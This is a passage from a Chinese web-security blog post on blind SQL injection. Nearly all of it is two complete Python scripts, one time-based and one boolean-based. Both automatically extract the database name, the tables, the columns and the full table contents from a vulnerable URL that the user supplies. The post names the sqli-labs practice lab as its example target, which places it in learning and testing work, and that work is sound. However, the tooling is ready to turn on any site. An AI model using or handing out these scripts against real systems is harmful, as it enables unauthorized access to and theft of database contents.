class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">author : L0ne1y</span><br><span class="line">time : 2021-08-29</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def close(url):</span><br><span class="line">    s = input(&quot;请输入闭合方式:&quot;)</span><br><span class="line">    url = url + s</span><br><span class="line">    return url</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def db_ascii_list():</span><br><span class="line">    ascii_list = []</span><br><span class="line">    for i in range(33, 127):</span><br><span class="line">        ascii_list.append(chr(i))</span><br><span class="line">    return ascii_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 爆破数据库名</span><br><span class="line">def db_name(url, str, ascii_list):</span><br><span class="line">    print(&quot;[-]开始爆破数据库名.......&quot;)</span><br><span class="line">    num = 1</span><br><span class="line">    while True:</span><br><span class="line">        db_payload = url + &quot; and if(length(database())=%d,sleep(2),1) --+&quot; % num</span><br><span class="line">        start_time = time.time()</span><br><span class="line">        # print(db_payload)</span><br><span class="line">        r = requests.get(db_payload)</span><br><span class="line">        if time.time() - start_time &gt; 2:</span><br><span class="line">            db_length = num</span><br><span class="line">            break</span><br><span class="line">        else:</span><br><span class="line">            num += 1</span><br><span class="line">    # print(db_length)</span><br><span class="line">    db_name = &#x27;&#x27;</span><br><span class="line">    for i in range(1, db_length + 1):</span><br><span class="line">        max = 127</span><br><span class="line">        min = 33</span><br><span class="line">        while abs(max - min) &gt; 1:</span><br><span class="line">            midx = int((max + min) / 2)</span><br><span class="line">            db_name_payload = url + &quot; and if(ord(mid((database()),%d,1))&gt;%d,sleep(2),1) --+&quot; % (i, midx)</span><br><span class="line">            # print(db_name_payload)</span><br><span class="line">            start_time = time.time()</span><br><span class="line">            r = requests.get(db_name_payload)</span><br><span class="line">            if time.time() - start_time &gt; 2:</span><br><span class="line">                min = midx</span><br><span class="line">            else:</span><br><span class="line">                max = midx</span><br><span class="line">        db_name += chr(max)</span><br><span class="line">    print(&quot;[+]数据库名：%s\n&quot; % db_name)</span><br><span class="line">    return db_name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 爆破表名</span><br><span class="line">def tb_name(url, str, ascii_list, db_name):</span><br><span class="line">    print(&quot;[-]开始爆破表名&quot;)</span><br><span class="line">    i = 1</span><br><span class="line">    while True:</span><br><span class="line">        tb_payload = url + &quot; and if((select count(table_name) from information_schema.tables where table_schema=&#x27;%s&#x27;)=%d,sleep(2),1) --+&quot; % (</span><br><span class="line">            db_name, i)</span><br><span class="line">        # print(tb_payload)</span><br><span class="line">        start_time = time.time()</span><br><span class="line">        r = requests.get(tb_payload)</span><br><span class="line">        if time.time() - start_time &gt; 2:</span><br><span class="line">            tb_number = i</span><br><span class="line">            break</span><br><span class="line">        else:</span><br><span class="line">            i += 1</span><br><span class="line">    j = 1</span><br><span class="line">    tb_name_length = []</span><br><span class="line">    for i in range(tb_number):</span><br><span class="line">        while True:</span><br><span class="line">            tb_name_length_payload = url + &quot; and if((select length(table_name) from information_schema.tables where table_schema=&#x27;%s&#x27; limit %d,1)=%d,sleep(2),1) --+&quot; % (</span><br><span class="line">                db_name, i, j)</span><br><span class="line">            # print(tb_name_length_payload)</span><br><span class="line">            start_time = time.time()</span><br><span class="line">            r = requests.get(tb_name_length_payload)</span><br><span class="line">            if time.time() - start_time &gt; 2:</span><br><span class="line">                tb_name_length.append(j)</span><br><span class="line">                j = 1</span><br><span class="line">                break</span><br><span class="line">            else:</span><br><span class="line">                j += 1</span><br><span class="line"></span><br><span class="line">    tb_name_list = []</span><br><span class="line">    for i in range(tb_number):</span><br><span class="line">        tb_name = &#x27;&#x27;</span><br><span class="line">        for j in range(1, tb_name_length[i] + 1):</span><br><span class="line">            max = 127</span><br><span class="line">            min = 33</span><br><span class="line">            while abs((max - min)) &gt; 1:</span><br><span class="line">                midx = int((max + min) / 2)</span><br><span class="line">                tb_name_payload = url + &quot; and if(ord(mid((select table_name from information_schema.tables where table_schema=&#x27;%s&#x27; limit %d,1),%d,1))&gt;%d,sleep(2),1) --+&quot; % (</span><br><span class="line">                    db_name, i, j, midx)</span><br><span class="line">                start_time = time.time()</span><br><span class="line">                r = requests.get(tb_name_payload)</span><br><span class="line">                # print(tb_name_payload)</span><br><span class="line">                if time.time() - start_time &gt; 2:</span><br><span class="line">                    min = midx</span><br><span class="line">                else:</span><br><span class="line">                    max = midx</span><br><span class="line">            tb_name += chr(max)</span><br><span class="line">        tb_name_list.append(tb_name)</span><br><span class="line">    print(&quot;\n[+]%s库下的%d张表为：%s\n&quot; % (db_name, tb_number, tb_name_list))</span><br><span class="line">    return tb_name_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def column_name(url, str, ascii_list, tb_name_list, db_name):</span><br><span class="line">    while True:</span><br><span class="line">        tb_name = input(&quot;请输入你选择的表名(例如 admin):&quot;)</span><br><span class="line">        if tb_name in tb_name_list:</span><br><span class="line">            break</span><br><span class="line">        else:</span><br><span class="line">            print(&quot;输入的表名有误,请重新输入&quot;)</span><br><span class="line"></span><br><span class="line">    j = 1</span><br><span class="line">    while True:</span><br><span class="line">        column_num_payload = url + &quot; and if((select count(column_name) from information_schema.columns where table_name=&#x27;%s&#x27; and table_schema=&#x27;%s&#x27;)=%d,sleep(2),1) --+&quot; % (</span><br><span class="line">            tb_name, db_name, j)</span><br><span class="line">        # print(column_num_payload)</span><br><span class="line">        start_time = time.time()</span><br><span class="line">        r = requests.get(column_num_payload)</span><br><span class="line">        if time.time() - start_time &gt; 2:</span><br><span class="line">            column_num = j</span><br><span class="line">            break</span><br><span class="line">        else:</span><br><span class="line">            j += 1</span><br><span class="line"></span><br><span class="line">    column_name_length = []</span><br><span class="line">    k = 1</span><br><span class="line">    for j in range(column_num):</span><br><span class="line">        while True:</span><br><span class="line">            column_name_length_payload = url + &quot; and if((select length(column_name) from information_schema.columns where table_name=&#x27;%s&#x27; and table_schema=&#x27;%s&#x27; limit %d,1)=%d,sleep(2),1) --+&quot; % (</span><br><span class="line">                tb_name, db_name, j, k)</span><br><span class="line">            # print(column_name_length_payload)</span><br><span class="line">            start_time = time.time()</span><br><span class="line">            r = requests.get(column_name_length_payload)</span><br><span class="line">            if time.time() - start_time &gt; 2:</span><br><span class="line">                column_name_length.append(k)</span><br><span class="line">                k = 1</span><br><span class="line">                break</span><br><span class="line">            else:</span><br><span class="line">                k += 1</span><br><span class="line"></span><br><span class="line">    print(&quot;[-]开始爆破%s表的字段名:&quot; % tb_name)</span><br><span class="line">    column_name_list = []</span><br><span class="line">    for i in range(len(column_name_length)):</span><br><span class="line">        column_name = &#x27;&#x27;</span><br><span class="line">        for j in range(1, column_name_length[i] + 1):</span><br><span class="line">            max = 127</span><br><span class="line">            min = 33</span><br><span class="line">            while abs(max - min) &gt; 1:</span><br><span class="line">                midx = int((max + min) / 2)</span><br><span class="line">                column_name_payload = url + &quot; and if(ord(mid((select column_name from information_schema.columns where table_name=&#x27;%s&#x27; and table_schema=&#x27;%s&#x27; limit %d,1),%d,1))&gt;%d,sleep(2),1) --+&quot; % (</span><br><span class="line">                    tb_name, db_name, i, j, midx)</span><br><span class="line">                # print(column_name_payload)</span><br><span class="line">                start_time = time.time()</span><br><span class="line">                r = requests.get(column_name_payload)</span><br><span class="line">                if time.time() - start_time &gt; 2:</span><br><span class="line">                    min = midx</span><br><span class="line">                else:</span><br><span class="line">                    max = midx</span><br><span class="line">            column_name += chr(max)</span><br><span class="line">        column_name_list.append(column_name)</span><br><span class="line">    print(&quot;[+]%s表的字段名分别为:%s&quot; % (tb_name, column_name_list))</span><br><span class="line">    return column_name_list, tb_name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def dump_data(url, str, tb_name, db_name, column_name_list):</span><br><span class="line">    i = 1</span><br><span class="line">    while True:</span><br><span class="line">        data_num_payload = url + &quot; and if((select count(*) from %s.%s)=%d,sleep(2),1) --+&quot; % (</span><br><span class="line">            db_name, tb_name, i)</span><br><span class="line">        # print(data_num_payload)</span><br><span class="line">        start_time = time.time()</span><br><span class="line">        r = requests.get(data_num_payload)</span><br><span class="line">        if time.time() - start_time &gt; 2:</span><br><span class="line">            data_num = i</span><br><span class="line">            break</span><br><span class="line">        else:</span><br><span class="line">            i += 1</span><br><span class="line">    print(&quot;[-]开始爆破%s数据库的%s表中数据:&quot; % (db_name, tb_name))</span><br><span class="line">    k = 1</span><br><span class="line">    data_length = []</span><br><span class="line">    dump_data_list = []</span><br><span class="line">    dump_data = &#x27;&#x27;</span><br><span class="line">    for i in column_name_list:</span><br><span class="line">        for j in range(data_num):</span><br><span class="line">            while True:</span><br><span class="line">                dump_data_length_payload = url + &quot; and if(ascii(substr((select %s from %s.%s limit %d,1),%d,1)),sleep(2),1) --+&quot; % (</span><br><span class="line">                    i, db_name, tb_name, j, k)</span><br><span class="line">                # print(dump_data_length_payload)</span><br><span class="line">                start_time = time.time()</span><br><span class="line">                r = requests.get(dump_data_length_payload)</span><br><span class="line">                if time.time() - start_time &lt; 2:</span><br><span class="line">                    dump_data_length = k - 1</span><br><span class="line">                    k = 1</span><br><span class="line">                    break</span><br><span class="line">                else:</span><br><span class="line">                    k += 1</span><br><span class="line">            data_length.append(dump_data_length)</span><br><span class="line">            for l in range(1, dump_data_length + 1):</span><br><span class="line">                max = 127</span><br><span class="line">                min = 33</span><br><span class="line">                while abs(max - min) &gt; 1:</span><br><span class="line">                    midx = int((max + min) / 2)</span><br><span class="line">                    dump_data_payload = url + &quot; and if(ord(mid((select %s from %s.%s limit %d,1),%d,1))&gt;%d,sleep(2),1) --+&quot; % (</span><br><span class="line">                        i, db_name, tb_name, j, l, midx)</span><br><span class="line">                    # print(dump_data_payload)</span><br><span class="line">                    start_time = time.time()</span><br><span class="line">                    r = requests.get(dump_data_payload)</span><br><span class="line">                    if time.time() - start_time &gt; 2:</span><br><span class="line">                        min = midx</span><br><span class="line">                    else:</span><br><span class="line">                        max = midx</span><br><span class="line">                dump_data += chr(max)</span><br><span class="line">                # print(dump_data)</span><br><span class="line">            dump_data_list.append(dump_data)</span><br><span class="line">            dump_data = &#x27;&#x27;</span><br><span class="line">            # print( dump_data_list)</span><br><span class="line">    print(&quot;[+]%s数据库的%s表的数据:&quot; % (db_name, tb_name))</span><br><span class="line">    j = 0</span><br><span class="line">    num_1 = len(dump_data_list) // data_num</span><br><span class="line">    for i in range(data_num):</span><br><span class="line">        j = i</span><br><span class="line">        for k in range(num_1):</span><br><span class="line">            print(&quot;%s\t\t&quot; % dump_data_list[j], end=&#x27;&#x27;)</span><br><span class="line">            j = i + data_num</span><br><span class="line">        print()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def re(url, str, ascii_list, tb_name_list, db_name):</span><br><span class="line">    while True:</span><br><span class="line">        tb_name = input(&quot;如需跑其他表,请输入任意字符,否则输入No(例如 admin):&quot;)</span><br><span class="line">        if tb_name == &#x27;NO&#x27; or tb_name == &#x27;No&#x27; or tb_name == &#x27;no&#x27;:</span><br><span class="line">            break</span><br><span class="line">        else:</span><br><span class="line">            print(tb_name_list)</span><br><span class="line">            column_name_list, tb_name = column_name(url, str, ascii_list, tb_name_list, db_name)</span><br><span class="line">            dump_data(url, str, tb_name, db_name, column_name_list)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = input(&quot;请输入URL:&quot;)  # 目标url http://127.0.0.1/sqli/Less-5/?id=1</span><br><span class="line">url = close(url)</span><br><span class="line">ascii_list = db_ascii_list()</span><br><span class="line">db_name = db_name(url, str, ascii_list)</span><br><span class="line">tb_name_list = tb_name(url, str, ascii_list, db_name)</span><br><span class="line">column_name_list, tb_name = column_name(url, str, ascii_list, tb_name_list, db_name)</span><br><span class="line">dump_data(url, str, tb_name, db_name, column_name_list)</span><br><span class="line">re(url, str, ascii_list, tb_name_list, db_name)</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="基于布尔的SQL盲注-逻辑判断"><a href="#基于布尔的SQL盲注-逻辑判断" class="headerlink" title="基于布尔的SQL盲注-逻辑判断"></a>基于布尔的SQL盲注-逻辑判断</h3><p>一般都用脚本跑</p>
+<p>页面只返回True和False两种类型页面。利用页面返回不同，逐个猜解数据。也可以用时间盲注</p>
+<p>查数据库名长度，需要一个一个试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and length(database())=8 --+</span><br></pre></td></tr></table></figure>
+
+<h4 id="脚本-1"><a href="#脚本-1" class="headerlink" title="脚本"></a>脚本</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def close(url):</span><br><span class="line">    s = input(&quot;请输入闭合方式:&quot;)</span><br><span class="line">    url = url + s</span><br><span class="line">    return url</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def db_ascii_list():</span><br><span class="line">    ascii_list = []</span><br><span class="line">    for i in range(33, 127):</span><br><span class="line">        ascii_list.append(chr(i))</span><br><span class="line">    return ascii_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 爆破数据库名</span><br><span class="line">def db_name(url, str, ascii_list):</span><br><span class="line">    print(&quot;[-]开始爆破数据库名.......&quot;)</span><br><span class="line">    num = 1</span><br><span class="line">    while True:</span><br><span class="line">        db_payload = url + &quot; and length(database())=%d --+&quot; % num</span><br><span class="line">        r = requests.get(db_payload)</span><br><span class="line">        if str in r.text:</span><br><span class="line">            db_length = num</span><br><span class="line">            break</span><br><span class="line">        else:</span><br><span class="line">            num += 1</span><br><span class="line">    db_name = &#x27;&#x27;</span><br><span class="line">    for i in range(1, db_length + 1):</span><br><span class="line">        for j in ascii_list:</span><br><span class="line">            db_name_payload = url + &quot; and ord(mid((database()),%d,1))=%d --+&quot; % (i, ord(j))</span><br><span class="line">            # print(db_name_payload)</span><br><span class="line">            r = requests.get(db_name_payload)</span><br><span class="line">            if str in r.text:</span><br><span class="line">                db_name += j</span><br><span class="line">                break</span><br><span class="line">            else:</span><br><span class="line">                pass</span><br><span class="line">    print(&quot;[+]数据库名：%s\n&quot; % db_name)</span><br><span class="line">    return db_name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 爆破表名</span><br><span class="line">def tb_name(url, str, ascii_list, db_name):</span><br><span class="line">    print(&quot;[-]开始爆破表名&quot;)</span><br><span class="line">    i = 1</span><br><span class="line">    while True:</span><br><span class="line">        tb_payload = url + &quot; and (select count(table_name) from information_schema.tables where table_schema=&#x27;%s&#x27;)=%d --+&quot; % (</span><br><span class="line">            db_name, i)</span><br><span class="line">        # print(tb_payload)</span><br><span class="line">        r = requests.get(tb_payload)</span><br><span class="line">        if str in r.text:</span><br><span class="line">            tb_number = i</span><br><span class="line">            break</span><br><span class="line">        else:</span><br><span class="line">            i += 1</span><br><span class="line">    j = 1</span><br><span class="line">    tb_name_length = []</span><br><span class="line">    for i in range(tb_number):</span><br><span class="line">        while True:</span><br><span class="line">            tb_name_length_payload = url + &quot; and (select length(table_name) from information_schema.tables where table_schema=&#x27;%s&#x27; limit %d,1)=%d --+&quot; % (</span><br><span class="line">                db_name, i, j)</span><br><span class="line">            # print(tb_name_length_payload)</span><br><span class="line">            r = requests.get(tb_name_length_payload)</span><br><span class="line">            if str in r.text:</span><br><span class="line">                tb_name_length.append(j)</span><br><span class="line">                j = 1</span><br><span class="line">                break</span><br><span class="line">            else:</span><br><span class="line">                j += 1</span><br><span class="line"></span><br><span class="line">    tb_name_list = []</span><br><span class="line">    for i in range(tb_number):</span><br><span class="line">        tb_name = &#x27;&#x27;</span><br><span class="line">        for j in range(1, tb_name_length[i] + 1):</span><br><span class="line">            for k in ascii_list:</span><br><span class="line">                tb_name_payload = url + &quot; and ord(mid((select table_name from information_schema.tables where table_schema=&#x27;%s&#x27; limit %d,1),%d,1))=%d --+&quot; % (</span><br><span class="line">                    db_name, i, j, ord(k))</span><br><span class="line">                r = requests.get(tb_name_payload)</span><br><span class="line">                # print(tb_name_payload)</span><br><span class="line">                if str in r.text:</span><br><span class="line">                    tb_name += k</span><br><span class="line">                    break</span><br><span class="line">                else:</span><br><span class="line">                    pass</span><br><span class="line">        tb_name_list.append(tb_name)</span><br><span class="line">    print(&quot;\n[+]%s库下的%d张表为：%s\n&quot; % (db_name, tb_number, tb_name_list))</span><br><span class="line">    return tb_name_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def column_name(url, str, ascii_list, tb_name_list, db_name):</span><br><span class="line">    while True:</span><br><span class="line">        tb_name = input(&quot;请输入你选择的表名(例如 admin):&quot;)</span><br><span class="line">        if tb_name in tb_name_list:</span><br><span class="line">            break</span><br><span class="line">        else:</span><br><span class="line">            print(&quot;输入的表名有误,请重新输入&quot;)</span><br><span class="line"></span><br><span class="line">    j = 1</span><br><span class="line">    while True:</span><br><span class="line">        column_num_payload = url + &quot; and (select count(column_name) from information_schema.columns where table_name=&#x27;%s&#x27; and table_schema=&#x27;%s&#x27;)=%d --+&quot; % (</span><br><span class="line">            tb_name, db_name, j)</span><br><span class="line">        # print(column_num_payload)</span><br><span class="line">        r = requests.get(column_num_payload)</span><br><span class="line">        if str in r.text:</span><br><span class="line">            column_num = j</span><br><span class="line">            break</span><br><span class="line">        else:</span><br><span class="line">            j += 1</span><br><span class="line"></span><br><span class="line">    column_name_length = []</span><br><span class="line">    k = 1</span><br><span class="line">    for i in range(column_num):</span><br><span class="line">        while True:</span><br><span class="line">            column_name_length_payload = url + &quot; and (select length(column_name) from information_schema.columns where table_name=&#x27;%s&#x27; limit %d,1)=%d --+&quot; % (</span><br><span class="line">                tb_name, i, k)</span><br><span class="line">            # print(column_name_length_payload)</span><br><span class="line">            r = requests.get(column_name_length_payload)</span><br><span class="line">            if str in r.text:</span><br><span class="line">                column_name_length.append(k)</span><br><span class="line">                k = 1</span><br><span class="line">                break</span><br><span class="line">            else:</span><br><span class="line">                k += 1</span><br><span class="line"></span><br><span class="line">    print(&quot;[-]开始爆破%s表的字段名:&quot; % tb_name)</span><br><span class="line">    column_name_list = []</span><br><span class="line">    for i in range(len(column_name_length)):</span><br><span class="line">        column_name = &#x27;&#x27;</span><br><span class="line">        for j in range(1, column_name_length[i] + 1):</span><br><span class="line">            for k in ascii_list:</span><br><span class="line">                column_name_payload = url + &quot; and ord(mid((select column_name from information_schema.columns where table_name=&#x27;%s&#x27; limit %d,1),%d,1))=%d --+&quot; % (</span><br><span class="line">                    tb_name, i, j, ord(k))</span><br><span class="line">                # print(column_name_payload)</span><br><span class="line">                r = requests.get(column_name_payload)</span><br><span class="line">                if str in r.text:</span><br><span class="line">                    column_name += k</span><br><span class="line">                    break</span><br><span class="line">                else:</span><br><span class="line">                    pass</span><br><span class="line">        column_name_list.append(column_name)</span><br><span class="line">    print(&quot;[+]%s表的字段名分别为:%s&quot; % (tb_name, column_name_list))</span><br><span class="line">    return column_name_list, tb_name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def dump_data(url, str, tb_name, db_name, column_name_list):</span><br><span class="line">    i = 1</span><br><span class="line">    while True:</span><br><span class="line">        data_num_payload = url + &quot; and (select count(*) from %s.%s)=%d --+&quot; % (db_name, tb_name, i)</span><br><span class="line">        # print(data_num_payload)</span><br><span class="line">        r = requests.get(data_num_payload)</span><br><span class="line">        if str in r.text:</span><br><span class="line">            data_num = i</span><br><span class="line">            break</span><br><span class="line">        else:</span><br><span class="line">            i += 1</span><br><span class="line">    print(&quot;[-]开始爆破%s数据库的%s表中数据:&quot; % (db_name, tb_name))</span><br><span class="line">    k = 1</span><br><span class="line">    data_length = []</span><br><span class="line">    dump_data_list = []</span><br><span class="line">    dump_data = &#x27;&#x27;</span><br><span class="line">    for i in column_name_list:</span><br><span class="line">        for j in range(data_num):</span><br><span class="line">            while True:</span><br><span class="line">                dump_data_length_payload = url + &quot; and ascii(substr((select %s from %s.%s limit %d,1),%d,1)) --+&quot; % (</span><br><span class="line">                    i, db_name, tb_name, j, k)</span><br><span class="line">                # print(dump_data_length_payload)</span><br><span class="line">                r = requests.get(dump_data_length_payload)</span><br><span class="line">                if str not in r.text:</span><br><span class="line">                    dump_data_length = k - 1</span><br><span class="line">                    k = 1</span><br><span class="line">                    break</span><br><span class="line">                else:</span><br><span class="line">                    k += 1</span><br><span class="line">            data_length.append(dump_data_length)</span><br><span class="line">            for l in range(1, dump_data_length + 1):</span><br><span class="line">                max = 127</span><br><span class="line">                min = 33</span><br><span class="line">                while abs(max - min) &gt; 1:</span><br><span class="line">                    midx = int((max + min) / 2)</span><br><span class="line">                    dump_data_payload = url + &quot; and ord(mid((select %s from %s.%s limit %d,1),%d,1))&gt;%d --+&quot; % (</span><br><span class="line">                        i, db_name, tb_name, j, l, midx)</span><br><span class="line">                    # print(dump_data_payload)</span><br><span class="line">                    r = requests.get(dump_data_payload)</span><br><span class="line">                    if str in r.text:</span><br><span class="line">                        min = midx</span><br><span class="line">                    else:</span><br><span class="line">                        max = midx</span><br><span class="line">                dump_data += chr(max)</span><br><span class="line">            dump_data_list.append(dump_data)</span><br><span class="line">            dump_data = &#x27;&#x27;</span><br><span class="line">            # print( dump_data_list)</span><br><span class="line">    print(&quot;[+]%s数据库的%s表的数据:&quot; % (db_name, tb_name))</span><br><span class="line">    j = 0</span><br><span class="line">    num_1 = len(dump_data_list) // data_num</span><br><span class="line">    for i in range(data_num):</span><br><span class="line">        j = i</span><br><span class="line">        for k in range(num_1):</span><br><span class="line">            print(&quot;%s\t\t&quot; % dump_data_list[j], end=&#x27;&#x27;)</span><br><span class="line">            j = i + data_num</span><br><span class="line">        print()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def re(url, str, ascii_list, tb_name_list, db_name):</span><br><span class="line">    while True:</span><br><span class="line">        tb_name = input(&quot;如需跑其他表,请输入任意字符,否则输入No(例如 admin):&quot;)</span><br><span class="line">        if tb_name == &#x27;NO&#x27; or tb_name == &#x27;No&#x27; or tb_name == &#x27;no&#x27;:</span><br><span class="line">            break</span><br><span class="line">        else:</span><br><span class="line">            print(tb_name_list)</span><br><span class="line">            column_name_list, tb_name = column_name(url, str, ascii_list, tb_name_list, db_name)</span><br><span class="line">            dump_data(url, str, tb_name, db_name, column_name_list)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = input(&quot;请输入URL:&quot;)  # 目标url http://127.0.0.1/sqli/Less-5/?id=1</span><br><span class="line">str = input(&quot;请输入正确页面返回字符串:&quot;)  # 布尔型盲注的true&amp;false的判断因素 You are in</span><br><span class="line">url = close(url)</span><br><span class="line">ascii_list = db_ascii_list()</span><br><span class="line">db_name = db_name(url, str, ascii_list)</span><br><span class="line">tb_name_list = tb_name(url, str, ascii_list, db_name)</span><br><span class="line">column_name_list, tb_name = column_name(url, str, ascii_list, tb_name_list, db_name)</span><br><span class="line">dump_data(url, str, tb_name, db_name, column_name_list)</span><br><span class="line">re(url, str, ascii_list, tb_name_list, db_name)</span><br></pre></td></tr></table></figure>
+
+<h3 id="涉及资源"><a href="#涉及资源" class="headerlink" title="涉及资源"></a>涉及资源</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://www.jianshu.com/p/bc35f8dd4f7c</span><br><span class="line"></span><br><span class="line">https://www.jianshu.com/p/fcae21926e5c</span><br><span class="line"></span><br><span class="line">https://pan.baidu.com/s/1IX6emxDpvYrVZbQzJbHn3g 提取码：l9f6</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2021/09/21/16WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%9F%A5%E8%AF%A2%E6%96%B9%E5%BC%8F%E5%8F%8A%E6%8A%A5%E9%94%99%E7%9B%B2%E6%B3%A8/">16WEB漏洞--SQL注入之查询方式及报错盲注</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页">Al0nez</a></p>
+        <p><span>发布时间:</span>2021-09-21, 10:29:31</p>
+        <p><span>最后更新:</span>2021-09-21, 11:22:29</p>
+        <p>
